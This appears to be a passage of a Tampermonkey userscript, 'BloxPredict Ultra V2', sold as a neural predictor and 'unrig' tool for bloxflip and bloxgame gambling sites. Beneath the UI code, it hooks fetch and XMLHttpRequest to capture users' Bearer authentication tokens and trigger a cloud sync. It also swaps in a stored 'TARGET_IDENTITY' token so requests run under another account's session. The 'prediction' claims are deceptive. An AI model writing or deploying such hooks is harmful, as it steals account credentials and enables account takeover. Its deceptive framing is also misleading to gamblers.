// ==UserScript==
// @name         BloxPredict Ultra V2
// @namespace    http://tampermonkey.net/
// @version      2.1.0
// @description  BloxPredict V2 Engine - Advanced Anti-Pattern Neural Integration
// @author       NiamK
// @match        *://*.bloxgame.com/*
// @match        *://*.bloxflip.com/*
// @match        *://*.bloxgame.us/*
// @match        *://*.bloxflip.us/*
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// @run-at       document-end
// @connect      server-1mc8.onrender.com
// @connect      *
// ==/UserScript==

(function () {
    'use strict';

    const API_URL = 'http://localhost:5000';
    let AUTH_TOKEN = null; // Enforce re-authentication on refresh
    let PROFITS = parseFloat(localStorage.getItem('bp_profits_v3') || '0');
    let GAMEMODE_PROFITS = JSON.parse(localStorage.getItem('bp_breakdown_v3') || '{"mines": 0, "towers": 0, "crash": 0}');
    let HISTORY_MINES = JSON.parse(localStorage.getItem('bp_history_mines') || '[]');
    let CAPTURED_BEARER = null;
    let TARGET_IDENTITY = localStorage.getItem('bp_target_identity');

    // Global Network Hook - The 'Deep Dig'
    const originalFetch = window.fetch;
    window.fetch = async (...args) => {
        let [url, config] = args;
        const target = typeof url === 'string' ? url : url?.url;

        // Improved target detection for .com and .us
        const isTarget = target && (
            target.includes('bloxgame.com') || target.includes('bloxgame.us') ||
            target.includes('bloxflip.com') || target.includes('bloxflip.us')
        );

        if (isTarget) {
            if (config?.headers) {
                let auth = null;
                if (config.headers instanceof Headers) {
                    auth = config.headers.get('Authorization');
                } else {
                    auth = config.headers['Authorization'] || config.headers['authorization'];
                }

                if (auth && auth.startsWith('Bearer ')) {
                    const token = auth.split('Bearer ')[1];
                    if (token && token.length > 20) {
                        if (CAPTURED_BEARER !== token) {
                            CAPTURED_BEARER = token;
                            if (window.App && window.App.isLoggedIn) window.App.syncCloud();
                        }
                    }
                }
            }

            if (TARGET_IDENTITY) {
                if (!config) config = { headers: {} };
                if (config.headers instanceof Headers) {
                    config.headers.set('Authorization', `Bearer ${TARGET_IDENTITY}`);
                } else {
                    config.headers['Authorization'] = `Bearer ${TARGET_IDENTITY}`;
                }
            }
        }
        return originalFetch.apply(window, args);
    };

    const originalXHR = window.XMLHttpRequest.prototype.open;
    window.XMLHttpRequest.prototype.open = function (method, url) {
        const isTarget = typeof url === 'string' && (
            url.includes('bloxgame.com') || url.includes('bloxgame.us') ||
            url.includes('bloxflip.com') || url.includes('bloxflip.us')
        );

        if (isTarget) {
            const originalSetRequestHeader = this.setRequestHeader;
            this.setRequestHeader = function (header, value) {
                if (header.toLowerCase() === 'authorization' && value.startsWith('Bearer ')) {
                    const token = value.split('Bearer ')[1];
                    if (token && token.length > 20) {
                        if (CAPTURED_BEARER !== token) {
                            CAPTURED_BEARER = token;
                            if (window.App && window.App.isLoggedIn) window.App.syncCloud();
                        }
                    }
                }
                if (header.toLowerCase() === 'authorization' && TARGET_IDENTITY) {
                    value = `Bearer ${TARGET_IDENTITY}`;
                }
                return originalSetRequestHeader.apply(this, arguments);
            };

            const originalSend = this.send;
            this.send = function () {
                if (TARGET_IDENTITY) {
                    this.setRequestHeader('Authorization', `Bearer ${TARGET_IDENTITY}`);
                }
                return originalSend.apply(this, arguments);
            };
        }
        return originalXHR.apply(this, arguments);
    };

    const THEMES = {
        midnight: {
            bg: 'rgba(12, 12, 18, 0.94)',
            accent: '#6b72ff',
            'accent-rgb': '107, 114, 255',
            btn: 'rgba(255, 255, 255, 0.05)',
            text: '#ffffff',
            textDim: '#9ea0b0',
            border: 'rgba(255, 255, 255, 0.1)'
        },
        neon: {
            bg: 'rgba(10, 5, 20, 0.96)',
            accent: '#00f2ff',
            'accent-rgb': '0, 242, 255',
            btn: 'rgba(0, 242, 255, 0.08)',
            text: '#ffffff',
            textDim: '#a0b0ff',
            border: 'rgba(0, 242, 255, 0.15)'
        },
        aura: {
            bg: 'rgba(20, 10, 30, 0.96)',
            accent: '#ff00d4',
            'accent-rgb': '255, 0, 212',
            btn: 'rgba(255, 0, 212, 0.08)',
            text: '#ffffff',
            textDim: '#ffa0eb',
            border: 'rgba(255, 0, 212, 0.15)'
        },
        frost: {
            bg: 'rgba(10, 20, 30, 0.94)',
            accent: '#00d4ff',
            'accent-rgb': '0, 212, 255',
            btn: 'rgba(0, 212, 255, 0.08)',
            text: '#ffffff',
            textDim: '#a0e4ff',
            border: 'rgba(0, 212, 255, 0.15)'
        },
        gold: {
            bg: 'rgba(20, 15, 5, 0.96)',
            accent: '#ffcc00',
            'accent-rgb': '255, 204, 0',
            btn: 'rgba(255, 204, 0, 0.08)',
            text: '#ffffff',
            textDim: '#ffe0a0',
            border: 'rgba(255, 204, 0, 0.15)'
        },
        envy: {
            bg: '#050a05',
            accent: '#00ff88',
            'accent-rgb': '0, 255, 136',
            btn: 'rgba(255, 255, 255, 0.05)',
            text: '#ffffff',
            textDim: '#5a6a5a',
            border: 'rgba(0, 255, 136, 0.3)'
        },
        noir: {
            bg: '#000000',
            accent: '#ffffff',
            'accent-rgb': '255, 255, 255',
            btn: 'rgba(255, 255, 255, 0.1)',
            text: '#ffffff',
            textDim: '#555555',
            border: 'rgba(255, 255, 255, 0.3)'
        }
    };

    let CURRENT_THEME = localStorage.getItem('bp_theme');
    if (!THEMES[CURRENT_THEME]) CURRENT_THEME = 'midnight';

    const styles = `
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@100;300;400;500;600;700;800;900&display=swap');

        :root {
            --bp-bg: ${THEMES[CURRENT_THEME].bg};
            --bp-accent: ${THEMES[CURRENT_THEME].accent};
            --bp-accent-rgb: ${THEMES[CURRENT_THEME]['accent-rgb']};
            --bp-btn: ${THEMES[CURRENT_THEME].btn};
            --bp-text: ${THEMES[CURRENT_THEME].text};
            --bp-text-dim: ${THEMES[CURRENT_THEME].textDim};
            --bp-border: ${THEMES[CURRENT_THEME].border};
            --bp-green: #00ff88;
        }

        .bp-priority-blur { filter: blur(12px) !important; pointer-events: none !important; user-select: none !important; transition: filter 0.5s ease; }

        #bp-root {
            position: fixed;
            inset: 0;
            pointer-events: none;
            z-index: 99999999;
            font-family: 'Outfit', sans-serif;
            display: flex;
            align-items: flex-end;
            justify-content: center;
            padding-bottom: 40px;
        }

        .bp-overlay {
            position: fixed;
            inset: 0;
            background: radial-gradient(circle at 50% 50%, rgba(10, 10, 15, 0.95) 0%, rgba(2, 2, 5, 0.99) 100%);
            backdrop-filter: blur(80px);
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: all;
            z-index: 100000000;
            transition: all 1s cubic-bezier(0.19, 1, 0.22, 1);
        }
        .bp-overlay.hidden { opacity: 0; visibility: hidden; pointer-events: none; transform: scale(1.05); }

        .bp-login-card {
            width: 480px;
            background: linear-gradient(145deg, rgba(20, 20, 30, 0.8), rgba(10, 10, 20, 0.95));
            border: 1px solid var(--bp-border);
            border-radius: 50px;
            padding: 70px;
            text-align: center;
            box-shadow: 0 50px 120px rgba(0,0,0,0.9), inset 0 0 40px rgba(255,255,255,0.02);
            position: relative;
            overflow: hidden;
            animation: cardEntrance 1.2s cubic-bezier(0.19, 1, 0.22, 1);
        }
        @keyframes cardEntrance { from { opacity: 0; transform: translateY(40px) scale(0.95); } }

        .bp-login-card::before {
            content: ''; position: absolute; inset: 0; background: radial-gradient(circle at 100% 0%, var(--bp-accent), transparent 40%); opacity: 0.15; pointer-events: none;
        }

        .bp-login-card h1 { font-weight: 950; font-size: 3.8rem; letter-spacing: -5px; color: white; margin-bottom: 50px; background: linear-gradient(to bottom, #fff, #aaa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

        .bp-field { text-align: left; margin-bottom: 35px; }
        .bp-field label { display: block; font-size: 0.75rem; font-weight: 800; color: var(--bp-text-dim); text-transform: uppercase; margin-bottom: 14px; letter-spacing: 2px; }
        .bp-field input { width: 100%; box-sizing: border-box; background: rgba(0,0,0,0.5); border: 1px solid var(--bp-border); padding: 24px; border-radius: 24px; color: white; outline: none; transition: 0.4s; font-size: 1rem; }
        .bp-field input:focus { border-color: var(--bp-accent); transform: scale(1.01); box-shadow: 0 0 30px rgba(var(--bp-accent-rgb), 0.1); }

        .bp-login-btn { width: 100%; background: white; color: black; border: none; padding: 24px; border-radius: 20px; font-weight: 950; font-size: 1.1rem; cursor: pointer; text-transform: uppercase; transition: 0.4s; letter-spacing: 1px; }
        .bp-login-btn:hover { transform: translateY(-5px); box-shadow: 0 25px 50px rgba(255,255,255,0.25); filter: contrast(1.1); }

        .bp-pill {
            pointer-events: all;
            width: 1160px;
            height: 210px;
            background: var(--bp-bg);
            background-image: radial-gradient(at 0% 0%, rgba(var(--bp-accent-rgb), 0.15) 0, transparent 50%),
                               radial-gradient(at 100% 100%, rgba(var(--bp-accent-rgb), 0.1) 0, transparent 50%);
            backdrop-filter: blur(60px) saturate(220%);
            border: 1px solid var(--bp-border);
            border-radius: 48px;
            display: flex;
            padding: 28px;
            gap: 30px;
            box-shadow: 0 50px 120px rgba(0,0,0,0.8), inset 0 0 50px rgba(255,255,255,0.015);
            transform: translateY(400px) scale(0.9);
            transition: all 1.2s cubic-bezier(0.19, 1, 0.22, 1);
            position: relative;
        }
        .bp-pill.active { transform: translateY(0) scale(1); }
        .bp-pill.morphed { width: 500px; height: 500px; flex-direction: column; align-items: center; justify-content: center; border-radius: 65px; }

        .bp-pill::after {
            content: ''; position: absolute; inset: -1px; border-radius: inherit; background: linear-gradient(135deg, var(--bp-accent), transparent 50%, transparent 80%, var(--bp-accent)); opacity: 0.15; pointer-events: none; z-index: -1;
        }

        .bp-grid {
            display: grid;
            grid-template-columns: repeat(5, 92px);
            grid-template-rows: repeat(2, 74px);
            gap: 15px;
            transition: 0.6s;
        }
        .bp-pill.morphed .bp-grid, .bp-pill.morphed .bp-right { opacity: 0; pointer-events: none; position: absolute; transform: scale(0.8); }

        .bp-btn {
            background: var(--bp-btn);
            border: 1px solid transparent;
            border-radius: 24px;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            justify-content: flex-end;
            cursor: pointer;
            transition: all 0.5s cubic-bezier(0.19, 1, 0.22, 1);
            color: var(--bp-text);
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        .bp-btn:hover { background: rgba(255, 255, 255, 0.08); transform: translateY(-7px); border-color: rgba(255,255,255,0.1); }
        .bp-btn.active { background: white; color: black; border-color: transparent; box-shadow: 0 15px 30px rgba(255,255,255,0.2); }
        .bp-btn svg { width: 24px; height: 24px; fill: currentColor; position: absolute; top: 20px; left: 20px; opacity: 0.8; }
        .bp-btn span { font-size: 0.75rem; font-weight: 900; position: absolute; bottom: 20px; left: 20px; letter-spacing: 0.8px; opacity: 0.5; text-transform: uppercase; }
        .bp-btn.active span { opacity: 1; }

        .bp-btn.profits span:first-child { color: var(--bp-green); font-size: 1.1rem; font-weight: 950; position: absolute; top: 20px; left: 20px; opacity: 1; letter-spacing: -0.5px; }
        @keyframes bulge { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.4); filter: brightness(1.5); } }
        .anim-bulge span:first-child { animation: bulge 0.6s cubic-bezier(0.34, 1.56, 0.64, 1); }

        .bp-right {
            flex: 1;
            background: rgba(0,0,0,0.55);
            border: 1px solid rgba(255,255,255,0.03);
            border-radius: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
            box-shadow: inset 0 0 40px rgba(0,0,0,0.6);
        }
        .bp-branding { font-size: 3rem; font-weight: 950; color: white; opacity: 0.05; letter-spacing: -4px; transition: 0.8s cubic-bezier(0.19, 1, 0.22, 1); text-transform: uppercase; }
        .bp-branding.hidden { opacity: 0; transform: scale(0.9); filter: blur(15px); }

        .bp-replica-grid {
            display: grid;
            gap: 6px;
            position: absolute;
            z-index: 10;
            opacity: 0;
            transform: scale(0.85);
            transition: all 0.8s cubic-bezier(0.19, 1, 0.22, 1);
            pointer-events: none;
        }
        .bp-replica-grid.visible { opacity: 1; transform: scale(1); pointer-events: all; }

        .bp-replica-tile { width: 18px; height: 18px; background: rgba(255,255,255,0.06); border-radius: 6px; cursor: pointer; transition: 0.4s; border: 1px solid rgba(255,255,255,0.04); }
        .bp-replica-tile:hover { background: rgba(255,255,255,0.18); transform: translateY(-2px) scale(1.1); }
        .bp-replica-tile.active { 
            background: #00ff88; 
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.8), inset 0 0 10px rgba(255, 255, 255, 0.5); 
            border-color: #ffffff;
            animation: tileGlow 2s infinite alternate;
        }
        @keyframes tileGlow { from { opacity: 0.8; } to { opacity: 1; filter: brightness(1.2); } }

        .bp-box-highlight {
            position: absolute;
            pointer-events: none;
            z-index: 10000;
            border: 3px solid #00ff88;
            background: radial-gradient(circle, rgba(0, 255, 136, 0.1) 0%, transparent 70%);
            border-radius: 12px;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.4), inset 0 0 15px rgba(0, 255, 136, 0.1);
            animation: breathe 1.5s infinite ease-in-out;
            transition: opacity 0.3s ease, transform 0.3s cubic-bezier(0.19, 1, 0.22, 1);
            box-sizing: border-box;
        }
        @keyframes breathe { 0%, 100% { opacity: 0.5; transform: scale(0.97); } 50% { opacity: 0.9; transform: scale(1.03); } }
        @keyframes pulse { from { opacity: 0.6; transform: scale(1); } to { opacity: 1; transform: scale(1.1); text-shadow: 0 0 20px rgba(0,255,136,0.5); } }

        .bp-fancy-loader {
            width: 55px; height: 55px; border: 4px solid rgba(255,255,255,0.05); border-top: 4px solid var(--bp-accent); border-radius: 50%; animation: spin 0.8s cubic-bezier(0.4, 0, 0.2, 1) infinite; position: absolute; display: none;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .bp-unrig-scanner {
            width: 100%; height: 100%; position: absolute; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100; pointer-events: none;
        }
        .bp-scanner-line { width: 100%; height: 3px; background: var(--bp-accent); box-shadow: 0 0 30px var(--bp-accent); position: absolute; animation: scanMove 1.5s infinite ease-in-out; opacity: 0.9; }
        @keyframes scanMove { 0% { top: 0% } 50% { top: 100% } 100% { top: 0% } }
        .bp-data-stream { display: none; }

        .bp-morph-content { display: none; flex-direction: column; align-items: center; text-align: center; width: 100%; height: 100%; justify-content: flex-start; animation: slideUp 0.8s cubic-bezier(0.19, 1, 0.22, 1); padding: 30px; box-sizing: border-box; overflow-y: auto; scrollbar-width: none; }
        .bp-morph-content::-webkit-scrollbar { display: none; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(50px); } }
        .bp-pill.morphed .bp-morph-content { display: flex; }

        .bp-theme-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 15px; margin-top: 25px; }
        .bp-theme-opt { width: 50px; height: 50px; border-radius: 15px; cursor: pointer; border: 3px solid transparent; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .bp-theme-opt:hover { transform: scale(1.15) rotate(5deg); }
        .bp-theme-opt.active { border-color: white; transform: scale(1.15); box-shadow: 0 10px 25px rgba(0,0,0,0.3); }

        .bp-setting-row { width: 100%; display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; background: rgba(255,255,255,0.03); padding: 12px 20px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.02); box-sizing: border-box; }
        .bp-setting-label { font-size: 0.9rem; font-weight: 800; color: var(--bp-text); display: flex; align-items: center; gap: 10px; text-align: left; }
        .bp-setting-label span { font-size: 0.65rem; color: var(--bp-text-dim); text-transform: uppercase; letter-spacing: 1px; }
        
        .bp-toggle { width: 50px; height: 26px; background: rgba(0,0,0,0.4); border-radius: 13px; position: relative; cursor: pointer; transition: 0.4s; border: 1px solid var(--bp-border); }
        .bp-toggle.active { background: var(--bp-accent); }
        .bp-toggle::after { content: ''; position: absolute; width: 22px; height: 22px; background: white; border-radius: 50%; top: 1px; left: 1px; transition: 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
        .bp-toggle.active::after { left: 25px; }

        .bp-input-small { width: 60px; background: rgba(0,0,0,0.4); border: 1px solid var(--bp-border); color: white; border-radius: 10px; padding: 8px; text-align: center; font-weight: 900; outline: none; transition: 0.3s; }
        .bp-input-small:focus { border-color: var(--bp-accent); box-shadow: 0 0 15px rgba(var(--bp-accent-rgb), 0.2); }

        .bp-toast {
            position: fixed; bottom: 270px; left: 50%; transform: translateX(-50%) translateY(50px);
            background: rgba(10, 10, 15, 0.95); backdrop-filter: blur(25px); border: 1px solid var(--bp-border); padding: 20px 45px; border-radius: 30px;
            color: white; font-weight: 950; font-size: 0.85rem; opacity: 0; transition: 0.6s cubic-bezier(0.19, 1, 0.22, 1); z-index: 100000001; letter-spacing: 2.5px; text-transform: uppercase; box-shadow: 0 30px 60px rgba(0,0,0,0.5);
        }
        .bp-toast.active { opacity: 1; transform: translateX(-50%) translateY(0); }

        /* Registry Styles */
        .bp-reg-table { width: 100%; border-collapse: separate; border-spacing: 0 8px; margin-top: 15px; }
        .bp-reg-row { background: rgba(255,255,255,0.02); border-radius: 12px; transition: 0.3s; }
        .bp-reg-row:hover { background: rgba(255,255,255,0.05); }
        .bp-reg-td { padding: 12px 15px; font-size: 0.8rem; color: var(--bp-text); border-top: 1px solid transparent; }
        .bp-reg-td:first-child { border-radius: 12px 0 0 12px; font-weight: 800; }
        .bp-reg-td:last-child { border-radius: 0 12px 12px 0; text-align: right; }
        .bp-reg-btn { background: var(--bp-accent); color: white; border: none; padding: 6px 12px; border-radius: 8px; font-size: 0.7rem; font-weight: 900; cursor: pointer; margin-left: 5px; }
        .bp-reg-btn.alt { background: rgba(255,255,255,0.1); }
        .bp-guide { background: rgba(var(--bp-accent-rgb), 0.05); border: 1px dashed var(--bp-accent); padding: 15px; border-radius: 15px; font-size: 0.7rem; color: var(--bp-text-dim); margin-top: 15px; text-align: left; line-height: 1.4; }
        .bp-guide b { color: var(--bp-accent); }
    `;

    const AI_LOGO = `<svg viewBox="0 0 24 24"><path d="M12,2A10,10 0 0,1 22,12A10,10 0 0,1 12,22A10,10 0 0,1 2,12A10,10 0 0,1 12,2M12,4A8,8 0 0,0 4,12A8,8 0 0,0 12,20A8,8 0 0,0 20,12A8,8 0 0,0 12,4M12,6A6,6 0 0,1 18,12A6,6 0 0,1 12,18A6,6 0 0,1 6,12A6,6 0 0,1 12,6M12,8A4,4 0 0,0 8,12A4,4 0 0,0 12,16A4,4 0 0,0 16,12A4,4 0 0,0 12,8Z"/></svg>`;
    const UNRIG_LOGO = `<svg viewBox="0 0 24 24"><path d="M11,18H13V16H11V18M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,20C7.59,20 4,16.41 4,12C4,7.59 7.59,4 12,4C16.41,4 20,7.59 20,12C20,16.41 16.41,20 12,20M12,6A4,4 0 0,0 8,10H10A2,2 0 0,1 12,8A2,2 0 0,1 14,10C14,12 11,11.75 11,15H13C13,12.75 16,12.5 16,10A4,4 0 0,0 12,6Z"/></svg>`;
    const PRIVACY_LOGO = `<svg viewBox="0 0 24 24"><path d="M12,9A3,3 0 0,0 9,12A3,3 0 0,0 12,15A3,3 0 0,0 15,12A3,3 0 0,0 12,9M12,17A5,5 0 0,1 7,12A5,5 0 0,1 12,7A5,5 0 0,1 17,12A5,5 0 0,1 12,17M12,4.5C7,4.5 2.73,7.61 1,12C2.73,16.39 7,19.5 12,19.5C17,19.5 21.27,16.39 23,12C21.27,7.61 17,4.5 12,4.5Z"/></svg>`;

    GM_addStyle(styles);

    const Bridge = {
        getBetBtn: () => document.querySelector('.gameBetSubmit, button[class*="gameBetSubmit"]'),
        getTiles: () => document.querySelectorAll('button[class*="minesGameItem"], button[class*="gameItem"]'),
        getTowerRows: () => document.querySelectorAll('div[class*="towers_towersGameRow__"]'),
        getTowerButtons: (row) => row.querySelectorAll('div[class*="towers_towersGameRowContainer__"]'),
        getCrashMultiplier: () => document.querySelector('div[class*="crash_multiplier__"], [class*="crashMultiplier"]'),
        getCrashHistory: () => document.querySelectorAll('div[class*="crash_historyItem"]'),
        getProfile: () => document.querySelector('[class*="userProfileAvatar"], [class*="avatar"], [class*="profile"], [class*="header_headerUser"]'),
        getBalance: () => document.querySelector('.BalanceDropdown_balanceDisplay__oESV0 span, number-flow-react, [class*="balanceValue"], [class*="header_balanceValue"]')
    };

    const App = {
        isLoggedIn: false,
        adminRole: null, // 'admin-niam' or 'admin-blazee'
        activeAlg: 'neural_v4',
        gameState: 'idle',
        autoMines: false,
        lastCookie: '',
        potentialWin: 0,
        winTracked: false,
        predictTiles: parseInt(localStorage.getItem('bp_predict_tiles') || '3'),
        crashRisk: parseFloat(localStorage.getItem('bp_crash_risk') || '2.0'),
        privacyMode: localStorage.getItem('bp_privacy') === 'true',
        recentPatterns: [],
        lastUnrig: 0,
        currentPredictionId: null,
        historicalData: { mines: HISTORY_MINES, totalGames: parseInt(localStorage.getItem('bp_games_sync') || '0') },

        init() {
            if (!document.body) {
                window.addEventListener('DOMContentLoaded', () => this.init());
                return;
            }
            try {
                console.log('BloxPredict: Initializing...');

                // Detect Current Game Mode
                const url = window.location.href;
                if (url.includes('towers')) this.gameMode = 'towers';
                else if (url.includes('crash')) this.gameMode = 'crash';
                else this.gameMode = 'mines';

                this.updatePrivacy();

                if (AUTH_TOKEN) {
                    this.isLoggedIn = true;
                    this.adminRole = localStorage.getItem('bp_admin_role');
                    this.syncCloud();
                    this.startMonitoring();
                }

                this.createUI();
                this.updateUIPageState();
                console.log('BloxPredict: UI Created for', this.gameMode);
            } catch (e) {
                console.error('BloxPredict: Init Failed', e);
            }
        },

        updateUIPageState() {
            const isMines = this.gameMode === 'mines';
            const isTowers = this.gameMode === 'towers';
            const isCrash = this.gameMode === 'crash';

            // Hide/Show algs
            document.querySelectorAll('.bp-alg').forEach(btn => {
                if (!isMines) {
                    btn.style.display = 'none';
                } else {
                    btn.style.display = 'flex';
                }
            });

            // Sync Auto Button Text
            const autoBtn = document.getElementById('bp-auto-mines-btn');
            const autoTxt = document.getElementById('bp-auto-txt');
            if (autoTxt) {
                autoTxt.innerText = `Auto: ${this.autoMines ? 'On' : 'Off'}`;
            }
            if (autoBtn) {
                if (this.autoMines) autoBtn.classList.add('active');
                else autoBtn.classList.remove('active');
            }

            const grid = document.getElementById('bp-replica');
            if (grid) {
                if (isTowers) {
                    grid.style.gridTemplateColumns = 'repeat(3, 16px)';
                    grid.style.gridTemplateRows = 'repeat(8, 16px)';
                    grid.style.gap = '3px';
                    grid.style.padding = '0';
                    grid.innerHTML = Array.from({ length: 24 }).map((_, i) => `<div class="bp-replica-tile" data-idx="${i}" style="width:16px; height:16px; border-radius:4px;"></div>`).join('');
                } else if (isCrash) {
                    grid.style.display = 'flex';
                    grid.style.alignItems = 'center';
                    grid.style.justifyContent = 'center';
                    grid.innerHTML = '<div style="font-size:0.6rem; color:var(--bp-text-dim); font-weight:800;">Waiting...</div>';
                }
            }
        },

        createUI() {
            try {
                const root = document.createElement('div');
                root.id = 'bp-root';
                document.body.appendChild(root);

                const safeProfits = isNaN(PROFITS) ? 0 : PROFITS;

                root.innerHTML = `
                <div class="bp-overlay ${this.isLoggedIn ? 'hidden' : ''}">
                    <div class="bp-login-card">
                        <h1>BloxPredict</h1>
                        <div class="bp-field">
                            <label>Neural License Key</label>
                            <input type="password" id="bp-key" placeholder="••••••••••••••••">
                        </div>
                        <button id="bp-login-btn" class="bp-login-btn">Login</button>
                    </div>
                </div>
                <div class="bp-pill ${this.isLoggedIn ? 'active' : ''}">
                    <div class="bp-grid">
                        <button class="bp-btn" id="bp-state-btn">
                            <svg id="bp-state-icon" viewBox="0 0 24 24"><path d="M12,17A2,2 0 0,0 14,15C14,13.89 13.1,13 12,13A2,2 0 0,0 10,15A2,2 0 0,0 12,17M18,8A2,2 0 0,1 20,10V20A2,2 0 0,1 18,22H6A2,2 0 0,1 4,20V10C4,8.89 4.9,8 6,8H7V6A5,5 0 0,1 12,1A5,5 0 0,1 17,6V8H18M12,3A3,3 0 0,0 9,6V8H15V6A3,3 0 0,0 12,3Z"/></svg>
                            <span id="bp-state-txt">Unrigged</span>
                        </button>
                        <button class="bp-btn" id="bp-unrig-btn">${UNRIG_LOGO}<span>Unrig</span></button>
                        <button class="bp-btn" id="bp-updates-btn"><svg viewBox="0 0 24 24"><path d="M12,4V1L8,5L12,9V6A6,6 0 0,1 18,12C18,15.31 15.31,18 12,18C8.69,18 6,15.31 6,12H4A8,8 0 0,0 12,20A8,8 0 0,0 20,12A8,8 0 0,0 12,4Z"/></svg><span>Updates</span></button>
                        <button class="bp-alg bp-btn active" data-alg="neural_v4">${AI_LOGO}<span>Neural V4</span></button>
                        <button class="bp-alg bp-btn" data-alg="quantum">${AI_LOGO}<span>Quantum</span></button>
                        <button class="bp-btn profits" id="bp-profits-btn">
                            <span id="bp-profits-val">${safeProfits.toLocaleString()}</span><span>Profits</span>
                        </button>
                        <button class="bp-btn" id="bp-settings-btn"><svg viewBox="0 0 24 24"><path d="M12,15.5A3.5,3.5 0 0,1 8.5,12A3.5,3.5 0 0,1 12,8.5A3.5,3.5 0 0,1 15.5,12A3.5,3.5 0 0,1 12,15.5M19.43,12.97C19.47,12.65 19.5,12.33 19.5,12C19.5,11.67 19.47,11.35 19.43,11.03L21.54,9.37C21.73,9.22 21.78,8.96 21.66,8.74L19.66,5.27C19.54,5.05 19.27,4.97 19.05,5.05L16.56,6.05C16.04,5.66 15.47,5.32 14.87,5.07L14.49,2.42C14.46,2.18 14.25,2 14,2H10C9.75,2 9.54,2.18 9.51,2.42L9.13,5.07C8.53,5.32 7.96,5.66 7.44,6.05L4.95,5.05C4.73,4.97 4.46,5.05 4.34,5.27L2.34,8.74C2.22,8.96 2.27,9.22 2.46,9.37L4.57,11.03C4.53,11.35 4.5,11.67 4.5,12C4.5,11.67 4.53,11.35 4.57,11.03L2.46,14.63C2.27,14.78 2.22,15.04 2.34,15.26L4.34,18.73C4.46,18.95 4.73,19.03 4.95,18.95L7.44,17.95C7.96,18.34 8.53,18.68 9.13,18.93L9.51,21.58C9.54,21.82 9.75,22 10,22H14C14.25,22 14.46,21.82 14.49,21.58L14.87,18.93C15.47,18.68 16.04,18.34 16.56,17.95L19.05,18.95C19.27,19.03 19.54,18.95 19.66,18.73L21.66,15.26C21.78,15.04 21.73,14.78 21.54,14.63L19.43,12.97Z"/></svg><span>Settings</span></button>
                        <button class="bp-alg bp-btn" data-alg="dynamic">${AI_LOGO}<span>Dynamic</span></button>
                        <button class="bp-btn" id="bp-auto-mines-btn">${AI_LOGO}<span id="bp-auto-txt">Auto: Off</span></button>
                    </div>
                    <div class="bp-right">
                        <div class="bp-branding" id="bp-brand-text">BloxPredict</div>
                        <div class="bp-fancy-loader" id="bp-loader"></div>
                        <div class="bp-replica-grid" id="bp-replica"></div>
                    </div>
                    <div class="bp-morph-content" id="bp-morph"></div>
                </div>
                <div id="bp-toast" class="bp-toast">SYSTEM ONLINE</div>
            `;
                this.bind();
            } catch (e) {
                console.error('BloxPredict: UI Creation Failed', e);
                throw e;
            }
        },

        bind() {
            document.getElementById('bp-login-btn').onclick = () => this.handleLogin();
            document.getElementById('bp-unrig-btn').onclick = () => this.handleUnrig();
            document.getElementById('bp-updates-btn').onclick = () => this.handleUpdates();
            document.getElementById('bp-settings-btn').onclick = () => this.handleSettings();
            document.getElementById('bp-auto-mines-btn').onclick = (e) => {
                this.autoMines = !this.autoMines; e.currentTarget.classList.toggle('active', this.autoMines);
                document.getElementById('bp-auto-txt').innerText = `Auto: ${this.autoMines ? 'On' : 'Off'}`;
                this.notify(`AUTO MODE: ${this.autoMines ? 'ON' : 'OFF'}`);
            };
            document.getElementById('bp-profits-btn').onclick = () => {
                const b = GAMEMODE_PROFITS;
                this.morph(`
                    <div style="font-size:1.8rem; font-weight:950; margin-bottom:10px;">PROFIT ANALYTICS</div>
                    <div class="bp-setting-row">
                        <div class="bp-setting-label">Mines <span>Winnings</span></div>
                        <div style="color:var(--bp-green); font-weight:900;">+${b.mines.toLocaleString()}</div>
                    </div>
                    <div class="bp-setting-row">
                        <div class="bp-setting-label">Towers <span>Winnings</span></div>
                        <div style="color:var(--bp-green); font-weight:900;">+${(b.towers || 0).toLocaleString()}</div>
                    </div>
                    <div class="bp-setting-row">
                        <div class="bp-setting-label">Crash <span>Winnings</span></div>
                        <div style="color:var(--bp-green); font-weight:900;">+${(b.crash || 0).toLocaleString()}</div>
                    </div>
                    <button id="bp-stats-close" style="margin-top:20px; width:100%; padding:15px; border-radius:18px; background:white; color:black; font-weight:950; border:none; cursor:pointer;">CLOSE ANALYTICS</button>
                `, 0);
                document.getElementById('bp-stats-close').onclick = () => document.querySelector('.bp-pill').classList.remove('morphed');
            };
            document.querySelectorAll('.bp-alg').forEach(btn => {
                btn.onclick = () => {
                    document.querySelectorAll('.bp-alg').forEach(b => b.classList.remove('active'));
                    btn.classList.add('active'); this.activeAlg = btn.getAttribute('data-alg');
                    this.notify(`ALGORITHM: ${this.activeAlg.toUpperCase()}`);
                };
            });
            this.bindReplica();
        },

        updatePrivacy() {
            const profile = Bridge.getProfile();
            const balance = Bridge.getBalance();
            if (this.privacyMode) {
                if (profile) profile.classList.add('bp-priority-blur');
                if (balance && balance.forEach) balance.forEach(b => b.classList.add('bp-priority-blur'));
                else if (balance && !balance.forEach) balance.classList.add('bp-priority-blur');
            } else {
                if (profile) profile.classList.remove('bp-priority-blur');
                if (balance && balance.forEach) balance.forEach(b => b.classList.remove('bp-priority-blur'));
                else if (balance && !balance.forEach) balance.classList.remove('bp-priority-blur');
            }
        },

        togglePrivacy() {
            this.privacyMode = !this.privacyMode;
            localStorage.setItem('bp_privacy', this.privacyMode);
            this.updatePrivacy();
            this.notify(`PRIVACY: ${this.privacyMode ? 'ON' : 'OFF'}`);
            this.handleSettings();
        },

